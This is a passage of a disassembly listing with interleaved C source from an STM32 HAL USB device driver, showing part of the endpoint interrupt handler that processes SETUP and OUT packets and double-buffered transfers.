 80028a0:	681b      	ldr	r3, [r3, #0]
 80028a2:	b292      	uxth	r2, r2
 80028a4:	f8a3 204c 	strh.w	r2, [r3, #76]	; 0x4c
          hpcd->USB_Address = 0U;
 80028a8:	687b      	ldr	r3, [r7, #4]
 80028aa:	2200      	movs	r2, #0
 80028ac:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 80028b0:	e348      	b.n	8002f44 <PCD_EP_ISR_Handler+0x76e>
      {
        /* DIR = 1 */

        /* DIR = 1 & CTR_RX => SETUP or OUT int */
        /* DIR = 1 & (CTR_TX | CTR_RX) => 2 int pending */
        ep = &hpcd->OUT_ep[0];
 80028b2:	687b      	ldr	r3, [r7, #4]
 80028b4:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80028b8:	657b      	str	r3, [r7, #84]	; 0x54
        wEPVal = PCD_GET_ENDPOINT(hpcd->Instance, PCD_ENDP0);
 80028ba:	687b      	ldr	r3, [r7, #4]
 80028bc:	681b      	ldr	r3, [r3, #0]
 80028be:	881b      	ldrh	r3, [r3, #0]
 80028c0:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

        if ((wEPVal & USB_EP_SETUP) != 0U)
 80028c4:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 80028c8:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 80028cc:	2b00      	cmp	r3, #0
 80028ce:	d032      	beq.n	8002936 <PCD_EP_ISR_Handler+0x160>
        {
          /* Get SETUP Packet */
          ep->xfer_count = PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 80028d0:	687b      	ldr	r3, [r7, #4]
 80028d2:	681b      	ldr	r3, [r3, #0]
 80028d4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80028d8:	b29b      	uxth	r3, r3
 80028da:	461a      	mov	r2, r3
 80028dc:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028de:	781b      	ldrb	r3, [r3, #0]
 80028e0:	00db      	lsls	r3, r3, #3
 80028e2:	4413      	add	r3, r2
 80028e4:	687a      	ldr	r2, [r7, #4]
 80028e6:	6812      	ldr	r2, [r2, #0]
 80028e8:	4413      	add	r3, r2
 80028ea:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80028ee:	881b      	ldrh	r3, [r3, #0]
 80028f0:	f3c3 0209 	ubfx	r2, r3, #0, #10
 80028f4:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028f6:	61da      	str	r2, [r3, #28]

          USB_ReadPMA(hpcd->Instance, (uint8_t *)hpcd->Setup,
 80028f8:	687b      	ldr	r3, [r7, #4]
 80028fa:	6818      	ldr	r0, [r3, #0]
 80028fc:	687b      	ldr	r3, [r7, #4]
 80028fe:	f503 712c 	add.w	r1, r3, #688	; 0x2b0
 8002902:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002904:	88da      	ldrh	r2, [r3, #6]
                      ep->pmaadress, (uint16_t)ep->xfer_count);
 8002906:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002908:	69db      	ldr	r3, [r3, #28]
          USB_ReadPMA(hpcd->Instance, (uint8_t *)hpcd->Setup,
 800290a:	b29b      	uxth	r3, r3
 800290c:	f005 ff23 	bl	8008756 <USB_ReadPMA>

          /* SETUP bit kept frozen while CTR_RX = 1 */
          PCD_CLEAR_RX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 8002910:	687b      	ldr	r3, [r7, #4]
 8002912:	681b      	ldr	r3, [r3, #0]
 8002914:	881b      	ldrh	r3, [r3, #0]
 8002916:	b29a      	uxth	r2, r3
 8002918:	f640 738f 	movw	r3, #3983	; 0xf8f
 800291c:	4013      	ands	r3, r2
 800291e:	823b      	strh	r3, [r7, #16]
 8002920:	687b      	ldr	r3, [r7, #4]
 8002922:	681b      	ldr	r3, [r3, #0]
 8002924:	8a3a      	ldrh	r2, [r7, #16]
 8002926:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 800292a:	b292      	uxth	r2, r2
 800292c:	801a      	strh	r2, [r3, #0]

          /* Process SETUP Packet*/
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->SetupStageCallback(hpcd);
#else
          HAL_PCD_SetupStageCallback(hpcd);
 800292e:	6878      	ldr	r0, [r7, #4]
 8002930:	f00a f904 	bl	800cb3c <HAL_PCD_SetupStageCallback>
 8002934:	e306      	b.n	8002f44 <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else if ((wEPVal & USB_EP_CTR_RX) != 0U)
 8002936:	f9b7 304a 	ldrsh.w	r3, [r7, #74]	; 0x4a
 800293a:	2b00      	cmp	r3, #0
 800293c:	f280 8302 	bge.w	8002f44 <PCD_EP_ISR_Handler+0x76e>
        {
          PCD_CLEAR_RX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 8002940:	687b      	ldr	r3, [r7, #4]
 8002942:	681b      	ldr	r3, [r3, #0]
 8002944:	881b      	ldrh	r3, [r3, #0]
 8002946:	b29a      	uxth	r2, r3
 8002948:	f640 738f 	movw	r3, #3983	; 0xf8f
 800294c:	4013      	ands	r3, r2
 800294e:	83fb      	strh	r3, [r7, #30]
 8002950:	687b      	ldr	r3, [r7, #4]
 8002952:	681b      	ldr	r3, [r3, #0]
 8002954:	8bfa      	ldrh	r2, [r7, #30]
 8002956:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 800295a:	b292      	uxth	r2, r2
 800295c:	801a      	strh	r2, [r3, #0]

          /* Get Control Data OUT Packet */
          ep->xfer_count = PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 800295e:	687b      	ldr	r3, [r7, #4]
 8002960:	681b      	ldr	r3, [r3, #0]
 8002962:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002966:	b29b      	uxth	r3, r3
 8002968:	461a      	mov	r2, r3
 800296a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800296c:	781b      	ldrb	r3, [r3, #0]
 800296e:	00db      	lsls	r3, r3, #3
 8002970:	4413      	add	r3, r2
 8002972:	687a      	ldr	r2, [r7, #4]
 8002974:	6812      	ldr	r2, [r2, #0]
 8002976:	4413      	add	r3, r2
 8002978:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800297c:	881b      	ldrh	r3, [r3, #0]
 800297e:	f3c3 0209 	ubfx	r2, r3, #0, #10
 8002982:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002984:	61da      	str	r2, [r3, #28]

          if ((ep->xfer_count != 0U) && (ep->xfer_buff != 0U))
 8002986:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002988:	69db      	ldr	r3, [r3, #28]
 800298a:	2b00      	cmp	r3, #0
 800298c:	d019      	beq.n	80029c2 <PCD_EP_ISR_Handler+0x1ec>
 800298e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002990:	695b      	ldr	r3, [r3, #20]
 8002992:	2b00      	cmp	r3, #0
 8002994:	d015      	beq.n	80029c2 <PCD_EP_ISR_Handler+0x1ec>
          {
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff,
 8002996:	687b      	ldr	r3, [r7, #4]
 8002998:	6818      	ldr	r0, [r3, #0]
 800299a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800299c:	6959      	ldr	r1, [r3, #20]
 800299e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029a0:	88da      	ldrh	r2, [r3, #6]
                        ep->pmaadress, (uint16_t)ep->xfer_count);
 80029a2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029a4:	69db      	ldr	r3, [r3, #28]
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff,
 80029a6:	b29b      	uxth	r3, r3
 80029a8:	f005 fed5 	bl	8008756 <USB_ReadPMA>

            ep->xfer_buff += ep->xfer_count;
 80029ac:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029ae:	695a      	ldr	r2, [r3, #20]
 80029b0:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029b2:	69db      	ldr	r3, [r3, #28]
 80029b4:	441a      	add	r2, r3
 80029b6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029b8:	615a      	str	r2, [r3, #20]

            /* Process Control Data OUT Packet */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
            hpcd->DataOutStageCallback(hpcd, 0U);
#else
            HAL_PCD_DataOutStageCallback(hpcd, 0U);
 80029ba:	2100      	movs	r1, #0
 80029bc:	6878      	ldr	r0, [r7, #4]
 80029be:	f00a f8cf 	bl	800cb60 <HAL_PCD_DataOutStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
          }

          wEPVal = (uint16_t)PCD_GET_ENDPOINT(hpcd->Instance, PCD_ENDP0);
 80029c2:	687b      	ldr	r3, [r7, #4]
 80029c4:	681b      	ldr	r3, [r3, #0]
 80029c6:	881b      	ldrh	r3, [r3, #0]
 80029c8:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

          if (((wEPVal & USB_EP_SETUP) == 0U) && ((wEPVal & USB_EP_RX_STRX) != USB_EP_RX_VALID))
 80029cc:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 80029d0:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 80029d4:	2b00      	cmp	r3, #0
 80029d6:	f040 82b5 	bne.w	8002f44 <PCD_EP_ISR_Handler+0x76e>
 80029da:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 80029de:	f403 5340 	and.w	r3, r3, #12288	; 0x3000
 80029e2:	f5b3 5f40 	cmp.w	r3, #12288	; 0x3000
 80029e6:	f000 82ad 	beq.w	8002f44 <PCD_EP_ISR_Handler+0x76e>
          {
            PCD_SET_EP_RX_CNT(hpcd->Instance, PCD_ENDP0, ep->maxpacket);
 80029ea:	687b      	ldr	r3, [r7, #4]
 80029ec:	681b      	ldr	r3, [r3, #0]
 80029ee:	61bb      	str	r3, [r7, #24]
 80029f0:	687b      	ldr	r3, [r7, #4]
 80029f2:	681b      	ldr	r3, [r3, #0]
 80029f4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80029f8:	b29b      	uxth	r3, r3
 80029fa:	461a      	mov	r2, r3
 80029fc:	69bb      	ldr	r3, [r7, #24]
 80029fe:	4413      	add	r3, r2
 8002a00:	61bb      	str	r3, [r7, #24]
 8002a02:	69bb      	ldr	r3, [r7, #24]
 8002a04:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002a08:	617b      	str	r3, [r7, #20]
 8002a0a:	697b      	ldr	r3, [r7, #20]
 8002a0c:	881b      	ldrh	r3, [r3, #0]
 8002a0e:	b29b      	uxth	r3, r3
 8002a10:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002a14:	b29a      	uxth	r2, r3
 8002a16:	697b      	ldr	r3, [r7, #20]
 8002a18:	801a      	strh	r2, [r3, #0]
 8002a1a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a1c:	691b      	ldr	r3, [r3, #16]
 8002a1e:	2b3e      	cmp	r3, #62	; 0x3e
 8002a20:	d91d      	bls.n	8002a5e <PCD_EP_ISR_Handler+0x288>
 8002a22:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a24:	691b      	ldr	r3, [r3, #16]
 8002a26:	095b      	lsrs	r3, r3, #5
 8002a28:	647b      	str	r3, [r7, #68]	; 0x44
 8002a2a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a2c:	691b      	ldr	r3, [r3, #16]
 8002a2e:	f003 031f 	and.w	r3, r3, #31
 8002a32:	2b00      	cmp	r3, #0
 8002a34:	d102      	bne.n	8002a3c <PCD_EP_ISR_Handler+0x266>
 8002a36:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8002a38:	3b01      	subs	r3, #1
 8002a3a:	647b      	str	r3, [r7, #68]	; 0x44
 8002a3c:	697b      	ldr	r3, [r7, #20]
 8002a3e:	881b      	ldrh	r3, [r3, #0]
 8002a40:	b29a      	uxth	r2, r3
 8002a42:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8002a44:	b29b      	uxth	r3, r3
 8002a46:	029b      	lsls	r3, r3, #10
 8002a48:	b29b      	uxth	r3, r3
 8002a4a:	4313      	orrs	r3, r2
 8002a4c:	b29b      	uxth	r3, r3
 8002a4e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002a52:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002a56:	b29a      	uxth	r2, r3
 8002a58:	697b      	ldr	r3, [r7, #20]
 8002a5a:	801a      	strh	r2, [r3, #0]
 8002a5c:	e026      	b.n	8002aac <PCD_EP_ISR_Handler+0x2d6>
 8002a5e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a60:	691b      	ldr	r3, [r3, #16]
 8002a62:	2b00      	cmp	r3, #0
 8002a64:	d10a      	bne.n	8002a7c <PCD_EP_ISR_Handler+0x2a6>
 8002a66:	697b      	ldr	r3, [r7, #20]
 8002a68:	881b      	ldrh	r3, [r3, #0]
 8002a6a:	b29b      	uxth	r3, r3
 8002a6c:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002a70:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002a74:	b29a      	uxth	r2, r3
 8002a76:	697b      	ldr	r3, [r7, #20]
 8002a78:	801a      	strh	r2, [r3, #0]
 8002a7a:	e017      	b.n	8002aac <PCD_EP_ISR_Handler+0x2d6>
 8002a7c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a7e:	691b      	ldr	r3, [r3, #16]
 8002a80:	085b      	lsrs	r3, r3, #1
 8002a82:	647b      	str	r3, [r7, #68]	; 0x44
 8002a84:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a86:	691b      	ldr	r3, [r3, #16]
 8002a88:	f003 0301 	and.w	r3, r3, #1
 8002a8c:	2b00      	cmp	r3, #0
 8002a8e:	d002      	beq.n	8002a96 <PCD_EP_ISR_Handler+0x2c0>
 8002a90:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8002a92:	3301      	adds	r3, #1
 8002a94:	647b      	str	r3, [r7, #68]	; 0x44
 8002a96:	697b      	ldr	r3, [r7, #20]
 8002a98:	881b      	ldrh	r3, [r3, #0]
 8002a9a:	b29a      	uxth	r2, r3
 8002a9c:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8002a9e:	b29b      	uxth	r3, r3
 8002aa0:	029b      	lsls	r3, r3, #10
 8002aa2:	b29b      	uxth	r3, r3
 8002aa4:	4313      	orrs	r3, r2
 8002aa6:	b29a      	uxth	r2, r3
 8002aa8:	697b      	ldr	r3, [r7, #20]
 8002aaa:	801a      	strh	r2, [r3, #0]
            PCD_SET_EP_RX_STATUS(hpcd->Instance, PCD_ENDP0, USB_EP_RX_VALID);
 8002aac:	687b      	ldr	r3, [r7, #4]
 8002aae:	681b      	ldr	r3, [r3, #0]
 8002ab0:	881b      	ldrh	r3, [r3, #0]
 8002ab2:	b29b      	uxth	r3, r3
 8002ab4:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8002ab8:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002abc:	827b      	strh	r3, [r7, #18]
 8002abe:	8a7b      	ldrh	r3, [r7, #18]
 8002ac0:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 8002ac4:	827b      	strh	r3, [r7, #18]
 8002ac6:	8a7b      	ldrh	r3, [r7, #18]
 8002ac8:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8002acc:	827b      	strh	r3, [r7, #18]
 8002ace:	687b      	ldr	r3, [r7, #4]
 8002ad0:	681a      	ldr	r2, [r3, #0]
 8002ad2:	8a7b      	ldrh	r3, [r7, #18]
 8002ad4:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002ad8:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002adc:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002ae0:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8002ae4:	b29b      	uxth	r3, r3
 8002ae6:	8013      	strh	r3, [r2, #0]
 8002ae8:	e22c      	b.n	8002f44 <PCD_EP_ISR_Handler+0x76e>
    }
    else
    {
      /* Decode and service non control endpoints interrupt */
      /* process related endpoint register */
      wEPVal = PCD_GET_ENDPOINT(hpcd->Instance, epindex);
 8002aea:	687b      	ldr	r3, [r7, #4]
 8002aec:	681b      	ldr	r3, [r3, #0]
 8002aee:	461a      	mov	r2, r3
 8002af0:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002af4:	009b      	lsls	r3, r3, #2
 8002af6:	4413      	add	r3, r2
 8002af8:	881b      	ldrh	r3, [r3, #0]
 8002afa:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

      if ((wEPVal & USB_EP_CTR_RX) != 0U)
 8002afe:	f9b7 304a 	ldrsh.w	r3, [r7, #74]	; 0x4a
 8002b02:	2b00      	cmp	r3, #0
 8002b04:	f280 80f6 	bge.w	8002cf4 <PCD_EP_ISR_Handler+0x51e>
      {
        /* clear int flag */
        PCD_CLEAR_RX_EP_CTR(hpcd->Instance, epindex);
 8002b08:	687b      	ldr	r3, [r7, #4]
 8002b0a:	681b      	ldr	r3, [r3, #0]
 8002b0c:	461a      	mov	r2, r3
 8002b0e:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002b12:	009b      	lsls	r3, r3, #2
 8002b14:	4413      	add	r3, r2
 8002b16:	881b      	ldrh	r3, [r3, #0]
 8002b18:	b29a      	uxth	r2, r3
 8002b1a:	f640 738f 	movw	r3, #3983	; 0xf8f
 8002b1e:	4013      	ands	r3, r2
 8002b20:	f8a7 3048 	strh.w	r3, [r7, #72]	; 0x48
 8002b24:	687b      	ldr	r3, [r7, #4]
 8002b26:	681b      	ldr	r3, [r3, #0]
 8002b28:	461a      	mov	r2, r3
 8002b2a:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002b2e:	009b      	lsls	r3, r3, #2
 8002b30:	4413      	add	r3, r2
 8002b32:	f8b7 2048 	ldrh.w	r2, [r7, #72]	; 0x48
 8002b36:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 8002b3a:	b292      	uxth	r2, r2
 8002b3c:	801a      	strh	r2, [r3, #0]
        ep = &hpcd->OUT_ep[epindex];
 8002b3e:	f897 204d 	ldrb.w	r2, [r7, #77]	; 0x4d
 8002b42:	4613      	mov	r3, r2
 8002b44:	009b      	lsls	r3, r3, #2
 8002b46:	4413      	add	r3, r2
 8002b48:	00db      	lsls	r3, r3, #3
 8002b4a:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002b4e:	687a      	ldr	r2, [r7, #4]
 8002b50:	4413      	add	r3, r2
 8002b52:	657b      	str	r3, [r7, #84]	; 0x54

        /* OUT Single Buffering */
        if (ep->doublebuffer == 0U)
 8002b54:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b56:	7b1b      	ldrb	r3, [r3, #12]
 8002b58:	2b00      	cmp	r3, #0
 8002b5a:	d123      	bne.n	8002ba4 <PCD_EP_ISR_Handler+0x3ce>
        {
          count = (uint16_t)PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 8002b5c:	687b      	ldr	r3, [r7, #4]
 8002b5e:	681b      	ldr	r3, [r3, #0]
 8002b60:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002b64:	b29b      	uxth	r3, r3
 8002b66:	461a      	mov	r2, r3
 8002b68:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b6a:	781b      	ldrb	r3, [r3, #0]
 8002b6c:	00db      	lsls	r3, r3, #3
 8002b6e:	4413      	add	r3, r2
 8002b70:	687a      	ldr	r2, [r7, #4]
 8002b72:	6812      	ldr	r2, [r2, #0]
 8002b74:	4413      	add	r3, r2
 8002b76:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002b7a:	881b      	ldrh	r3, [r3, #0]
 8002b7c:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002b80:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

          if (count != 0U)
 8002b84:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002b88:	2b00      	cmp	r3, #0
 8002b8a:	f000 808e 	beq.w	8002caa <PCD_EP_ISR_Handler+0x4d4>
          {
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaadress, count);
 8002b8e:	687b      	ldr	r3, [r7, #4]
 8002b90:	6818      	ldr	r0, [r3, #0]
 8002b92:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b94:	6959      	ldr	r1, [r3, #20]
 8002b96:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b98:	88da      	ldrh	r2, [r3, #6]
 8002b9a:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002b9e:	f005 fdda 	bl	8008756 <USB_ReadPMA>
 8002ba2:	e082      	b.n	8002caa <PCD_EP_ISR_Handler+0x4d4>
        }
#if (USE_USB_DOUBLE_BUFFER == 1U)
        else
        {
          /* manage double buffer bulk out */
          if (ep->type == EP_TYPE_BULK)
 8002ba4:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ba6:	78db      	ldrb	r3, [r3, #3]
 8002ba8:	2b02      	cmp	r3, #2
 8002baa:	d10a      	bne.n	8002bc2 <PCD_EP_ISR_Handler+0x3ec>
          {
            count = HAL_PCD_EP_DB_Receive(hpcd, ep, wEPVal);
 8002bac:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002bb0:	461a      	mov	r2, r3
 8002bb2:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002bb4:	6878      	ldr	r0, [r7, #4]
 8002bb6:	f000 f9d3 	bl	8002f60 <HAL_PCD_EP_DB_Receive>
 8002bba:	4603      	mov	r3, r0
 8002bbc:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50
 8002bc0:	e073      	b.n	8002caa <PCD_EP_ISR_Handler+0x4d4>
          }
          else /* manage double buffer iso out */
          {
            /* free EP OUT Buffer */
            PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 8002bc2:	687b      	ldr	r3, [r7, #4]
 8002bc4:	681b      	ldr	r3, [r3, #0]
 8002bc6:	461a      	mov	r2, r3
 8002bc8:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bca:	781b      	ldrb	r3, [r3, #0]
 8002bcc:	009b      	lsls	r3, r3, #2
 8002bce:	4413      	add	r3, r2
 8002bd0:	881b      	ldrh	r3, [r3, #0]
 8002bd2:	b29b      	uxth	r3, r3
 8002bd4:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8002bd8:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002bdc:	f8a7 3052 	strh.w	r3, [r7, #82]	; 0x52
 8002be0:	687b      	ldr	r3, [r7, #4]
 8002be2:	681b      	ldr	r3, [r3, #0]
 8002be4:	461a      	mov	r2, r3
 8002be6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002be8:	781b      	ldrb	r3, [r3, #0]
 8002bea:	009b      	lsls	r3, r3, #2
 8002bec:	441a      	add	r2, r3
 8002bee:	f8b7 3052 	ldrh.w	r3, [r7, #82]	; 0x52
 8002bf2:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002bf6:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002bfa:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002bfe:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8002c02:	b29b      	uxth	r3, r3
 8002c04:	8013      	strh	r3, [r2, #0]

            if ((PCD_GET_ENDPOINT(hpcd->Instance, ep->num) & USB_EP_DTOG_RX) != 0U)
 8002c06:	687b      	ldr	r3, [r7, #4]
 8002c08:	681b      	ldr	r3, [r3, #0]
 8002c0a:	461a      	mov	r2, r3
 8002c0c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c0e:	781b      	ldrb	r3, [r3, #0]
 8002c10:	009b      	lsls	r3, r3, #2
 8002c12:	4413      	add	r3, r2
 8002c14:	881b      	ldrh	r3, [r3, #0]
 8002c16:	b29b      	uxth	r3, r3
 8002c18:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8002c1c:	2b00      	cmp	r3, #0
 8002c1e:	d022      	beq.n	8002c66 <PCD_EP_ISR_Handler+0x490>
            {
              /* read from endpoint BUF0Addr buffer */
              count = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 8002c20:	687b      	ldr	r3, [r7, #4]
 8002c22:	681b      	ldr	r3, [r3, #0]
 8002c24:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002c28:	b29b      	uxth	r3, r3
 8002c2a:	461a      	mov	r2, r3
 8002c2c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c2e:	781b      	ldrb	r3, [r3, #0]
 8002c30:	00db      	lsls	r3, r3, #3
 8002c32:	4413      	add	r3, r2
 8002c34:	687a      	ldr	r2, [r7, #4]
 8002c36:	6812      	ldr	r2, [r2, #0]
 8002c38:	4413      	add	r3, r2
 8002c3a:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002c3e:	881b      	ldrh	r3, [r3, #0]
 8002c40:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002c44:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

              if (count != 0U)
 8002c48:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002c4c:	2b00      	cmp	r3, #0
 8002c4e:	d02c      	beq.n	8002caa <PCD_EP_ISR_Handler+0x4d4>
              {
                USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr0, count);
 8002c50:	687b      	ldr	r3, [r7, #4]
 8002c52:	6818      	ldr	r0, [r3, #0]
 8002c54:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c56:	6959      	ldr	r1, [r3, #20]
 8002c58:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c5a:	891a      	ldrh	r2, [r3, #8]
 8002c5c:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002c60:	f005 fd79 	bl	8008756 <USB_ReadPMA>
 8002c64:	e021      	b.n	8002caa <PCD_EP_ISR_Handler+0x4d4>
              }
            }
            else
            {
              /* read from endpoint BUF1Addr buffer */
              count = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 8002c66:	687b      	ldr	r3, [r7, #4]
 8002c68:	681b      	ldr	r3, [r3, #0]
 8002c6a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002c6e:	b29b      	uxth	r3, r3
 8002c70:	461a      	mov	r2, r3
 8002c72:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c74:	781b      	ldrb	r3, [r3, #0]
 8002c76:	00db      	lsls	r3, r3, #3
 8002c78:	4413      	add	r3, r2
 8002c7a:	687a      	ldr	r2, [r7, #4]
 8002c7c:	6812      	ldr	r2, [r2, #0]
 8002c7e:	4413      	add	r3, r2
 8002c80:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002c84:	881b      	ldrh	r3, [r3, #0]
 8002c86:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002c8a:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

              if (count != 0U)
 8002c8e:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002c92:	2b00      	cmp	r3, #0
 8002c94:	d009      	beq.n	8002caa <PCD_EP_ISR_Handler+0x4d4>
              {
                USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr1, count);
 8002c96:	687b      	ldr	r3, [r7, #4]
 8002c98:	6818      	ldr	r0, [r3, #0]
 8002c9a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c9c:	6959      	ldr	r1, [r3, #20]
 8002c9e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ca0:	895a      	ldrh	r2, [r3, #10]
 8002ca2:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002ca6:	f005 fd56 	bl	8008756 <USB_ReadPMA>
          }
        }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

        /* multi-packet on the NON control OUT endpoint */
        ep->xfer_count += count;
 8002caa:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002cac:	69da      	ldr	r2, [r3, #28]
 8002cae:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002cb2:	441a      	add	r2, r3
 8002cb4:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002cb6:	61da      	str	r2, [r3, #28]
        ep->xfer_buff += count;
 8002cb8:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002cba:	695a      	ldr	r2, [r3, #20]
 8002cbc:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002cc0:	441a      	add	r2, r3
 8002cc2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002cc4:	615a      	str	r2, [r3, #20]

        if ((ep->xfer_len == 0U) || (count < ep->maxpacket))
 8002cc6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002cc8:	699b      	ldr	r3, [r3, #24]
 8002cca:	2b00      	cmp	r3, #0
 8002ccc:	d005      	beq.n	8002cda <PCD_EP_ISR_Handler+0x504>
 8002cce:	f8b7 2050 	ldrh.w	r2, [r7, #80]	; 0x50
 8002cd2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002cd4:	691b      	ldr	r3, [r3, #16]
